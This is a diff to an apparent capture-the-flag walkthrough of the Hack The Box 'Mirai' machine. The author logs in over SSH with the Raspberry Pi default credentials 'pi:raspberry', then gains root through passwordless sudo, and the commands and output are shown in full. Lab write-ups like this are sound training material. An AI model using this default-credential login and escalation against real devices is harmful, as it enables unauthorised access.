@@ -74,4 +74,65 @@ swfobject.js            [Status: 200, Size: 61, Words: 10, Lines: 2, Duration: 1
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e6cd0a3c-e8a8-4a8b-8004-e75842a22994)
 
-navigating to the admin dir, we can see it is running a `PI-Hole` service. 
+navigating to the admin dir, we can see it is running a `PI-Hole` service.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/adc53ccf-aa20-4672-8d20-cfc0841f0851)
+
+checking the login page, tried to login with default creds, none worked 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1af209e8-3cd6-4c50-a535-f7ab32a06785)
+
+checked google for `pihole` default password, and got `pi:raspberry`. let's try login ssh using this creds.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Mirai]
+└─$ ssh pi@mirai.htb          
+The authenticity of host 'mirai.htb (10.10.10.48)' can't be established.
+ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:101: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'mirai.htb' (ED25519) to the list of known hosts.
+pi@mirai.htb's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jun  2 08:03:17 2023 from 10.10.14.16
+
+SSH is enabled and the default password for the 'pi' user has not been changed.
+This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.
+
+
+SSH is enabled and the default password for the 'pi' user has not been changed.
+This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.
+
+pi@raspberrypi:~$ id
+uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
+pi@raspberrypi:~$
+```
+bull's eye we logged in ssh.
+
+
+## Privilege Escalation
+
+```
+pi@raspberrypi:~$ sudo -l
+Matching Defaults entries for pi on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User pi may run the following commands on localhost:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+pi@raspberrypi:~$ sudo su
+root@raspberrypi:/home/pi# cd
+root@raspberrypi:~# 
+```
+checking sudo privs, we can see we are allowed to run sudo without password `sudo su` got use a root shell.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/cdcb9b9a-b229-4d95-8f69-9309a94865ad)
+
+and we are through 😜 had fun yeah?
